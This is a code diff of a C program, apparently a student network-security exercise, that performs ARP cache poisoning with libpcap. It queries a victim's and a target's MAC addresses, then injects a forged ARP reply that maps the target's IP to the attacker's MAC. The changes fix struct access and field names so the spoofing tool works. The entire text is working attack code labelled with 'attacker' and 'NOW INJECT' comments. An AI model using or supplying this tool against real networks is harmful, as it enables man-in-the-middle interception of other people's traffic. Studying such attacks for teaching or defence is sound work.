@@ -42,32 +42,33 @@ int main(int argc, char* argv[]) {
 	}
 
 	// me(attacker) request to victim for mac address.
-	gen_arp_packet(packet, myaddr->mac, NULL, myaddr->ip, sender->ip, ARPOP_REQUEST);
+	// void gen_arp_packet(uint8_t *packet, uint8_t *sourcemac, uint8_t *destmac, uint8_t *sourceip, uint8_t *destip, u_int16_t opcode )
+	gen_arp_packet(packet, myaddr.mac, NULL, myaddr.ip, sender.ip, ARPOP_REQUEST);
 	pcap_send_check(pcd, packet);
 
 	while(1) {
 		pcap_next_ex(pcd, &header, &packet_recv);
 		eptr = (struct ether_header *) packet_recv;
 		aptr = (struct arp_hdr_ *) (packet_recv + 14);
-		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->ar_op) == ARPOP_REPLY)	break;
+		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->opcode) == ARPOP_REPLY)	break;
 	}
-	memcpy(sender->mac, aptr->sender_mac, ETHER_ADDR_LEN);
+	memcpy(sender.mac, aptr->sender_mac, ETHER_ADDR_LEN);
 
-	gen_arp_packet(packet, myaddr->mac, NULL, myaddr->ip, target->ip, ARPOP_REQUEST);
+	gen_arp_packet(packet, myaddr.mac, NULL, myaddr.ip, target.ip, ARPOP_REQUEST);
 	pcap_send_check(pcd, packet);
 
 
 	while(1) {
-		pcap_next_ex(handle, &header, &packet_recv);
+		pcap_next_ex(pcd, &header, &packet_recv);
 		eptr = (struct ether_header *) packet_recv;
 		aptr = (struct arp_hdr_ *) (packet_recv + 14);
-		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->ar_op) == ARPOP_REPLY)   break;
+		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->opcode) == ARPOP_REPLY)   break;
 	}
-	memcpy(target->mac, aptr->sender_mac, ETHER_ADDR_LEN);
+	memcpy(target.mac, aptr->sender_mac, ETHER_ADDR_LEN);
 
 	puts("\n----- NOW INJECT -----\n");
 
-	gen_arp_packet(packet, myaddr->mac, sender->mac, target->ip, sender->ip, ARPOP_REPLY);
+	gen_arp_packet(packet, myaddr.mac, sender.mac, target.ip, sender.ip, ARPOP_REPLY);
 	pcap_send_check(pcd,packet);
 
 	printf("\n[ FINISHED ]\n");
